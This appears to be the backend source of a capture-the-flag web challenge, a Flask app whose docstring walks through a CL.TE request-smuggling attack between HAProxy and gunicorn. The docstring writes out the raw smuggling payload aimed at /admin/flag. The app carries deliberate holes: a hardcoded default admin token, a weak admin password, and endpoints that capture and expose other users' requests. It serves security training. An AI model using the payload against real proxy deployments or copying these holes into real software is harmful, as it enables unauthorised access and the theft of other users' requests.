#!/usr/bin/env python3
"""
Corp backend application.
The /admin/flag endpoint is protected by X-Admin-Token header.
The admin bot sends this token with every request.

CL.TE Smuggling attack:
HAProxy reads Content-Length and sends exactly N bytes to gunicorn.
gunicorn's HTTP parser prefers Transfer-Encoding: chunked over Content-Length.
If Transfer-Encoding is present, gunicorn reads chunks — leaving the "leftover"
data from the chunked body as the prefix of the next request on the same connection.

Exploit payload (sent in a single TCP connection):
  POST / HTTP/1.1\r\n
  Host: target\r\n
  Content-Length: 68\r\n
  Transfer-Encoding: chunked\r\n
  \r\n
  0\r\n
  \r\n
  GET /admin/flag HTTP/1.1\r\n
  X-Admin-Token: secret-admin-token-xyz\r\n
  Foo: bar

  [NEXT NORMAL REQUEST follows immediately]

HAProxy: reads CL=68, forwards full body.
gunicorn: sees TE:chunked, reads "0\r\n\r\n" (empty chunk = end), stops.
Leftover "GET /admin/flag..." becomes prefix of next request from backend's queue.
When the admin bot's next request arrives, it's appended after the smuggled prefix,
causing the smuggled GET to be processed with the admin token from the bot.

Simpler reliable path: smuggle "GET /admin/flag HTTP/1.1\r\nX-Admin-Token: <value>\r\n"
directly — the token value is known from the challenge description hint.
"""
import os
import time
from flask import Flask, request, jsonify, render_template_string, session, redirect

app = Flask(__name__)
app.secret_key = "desync-secret-not-relevant"

FLAG = os.environ.get("FLAG", "HL4{EJEMPLO_LOCAL}")
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "secret-admin-token-xyz")

# Request capture log for smuggling demonstration
captured_requests = []

HTML_HOME = """<!DOCTYPE html>
<html>
<head>
  <title>Corp Internal App</title>
  <style>
    body { font-family:monospace; background:#0d1117; color:#c9d1d9; padding:2rem; }
    h1 { color:#58a6ff; }
    a { color:#58a6ff; }
    .card { background:#161b22; border:1px solid #30363d; padding:1rem; margin:0.5rem 0; border-radius:4px; }
    code { background:#1f2937; padding:2px 6px; border-radius:3px; }
  </style>
</head>
<body>
  <h1>Corp Internal Application</h1>
  <div class="card">
    <p>Endpoints:</p>
    <ul>
      <li><a href="/profile">GET /profile</a> — User profile</li>
      <li>POST /login — Authenticate</li>
      <li>GET /admin/flag — Admin only (requires <code>X-Admin-Token</code>)</li>
      <li>POST /capture — Capture next request body</li>
    </ul>
  </div>
  <div class="card">
    <p>Infrastructure: HAProxy 2.8 → gunicorn 21.2</p>
    <p>Note: This application runs behind a load balancer.</p>
  </div>
</body>
</html>"""


@app.route("/")
def home():
    return render_template_string(HTML_HOME)


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if username == "admin" and password == "nottheway":
            session["user"] = "admin"
            return jsonify({"status": "ok", "user": "admin"})
        if username and password:
            session["user"] = username
            return jsonify({"status": "ok", "user": username})
        return jsonify({"error": "invalid credentials"}), 401
    return """<form method=POST>
    <input name=username placeholder=username>
    <input name=password type=password placeholder=password>
    <button type=submit>Login</button>
    </form>"""


@app.route("/profile")
def profile():
    user = session.get("user", "anonymous")
    return jsonify({
        "user": user,
        "endpoint": "/profile",
        "headers": dict(request.headers),
        "message": "Welcome to Corp Internal"
    })


@app.route("/admin/flag")
def admin_flag():
    """
    Returns the flag ONLY if X-Admin-Token header matches.
    The admin bot sends this token with every request.
    Via CL.TE smuggling, an attacker can inject a GET request to this
    endpoint with the admin token, poisoning the backend's request queue.
    The token value can also be discovered by capturing the admin bot's request.
    """
    token = request.headers.get("X-Admin-Token", "")
    if token == ADMIN_TOKEN:
        return jsonify({
            "status": "authorized",
            "flag": FLAG,
            "message": "Access granted to admin vault"
        })
    return jsonify({
        "status": "forbidden",
        "error": "Missing or invalid X-Admin-Token",
        "hint": "This endpoint requires a valid admin token header"
    }), 403


@app.route("/capture", methods=["POST"])
def capture():
    """
    Capture endpoint for demonstrating smuggling.
    When used as the smuggling target, the next victim's request body
    (or headers, depending on smuggling technique) is stored here.
    """
    body = request.get_data(as_text=True)
    headers = dict(request.headers)
    entry = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "method": request.method,
        "headers": headers,
        "body": body[:2000]  # limit stored size
    }
    captured_requests.append(entry)
    # Keep only last 10
    if len(captured_requests) > 10:
        captured_requests.pop(0)

    return jsonify({"status": "captured", "id": len(captured_requests)})


@app.route("/capture/log")
def capture_log():
    """View captured requests (demonstrates smuggling effect)."""
    return jsonify({
        "count": len(captured_requests),
        "requests": captured_requests
    })


@app.route("/debug/headers")
def debug_headers():
    """Shows all headers as received by gunicorn — useful for understanding the smuggling."""
    return jsonify({
        "remote_addr": request.remote_addr,
        "headers": dict(request.headers),
        "method": request.method,
        "path": request.path,
        "query": request.query_string.decode()
    })


if __name__ == "__main__":
    print("[*] Backend starting on :5000 (direct, no gunicorn)")
    app.run(host="0.0.0.0", port=5000, debug=False)
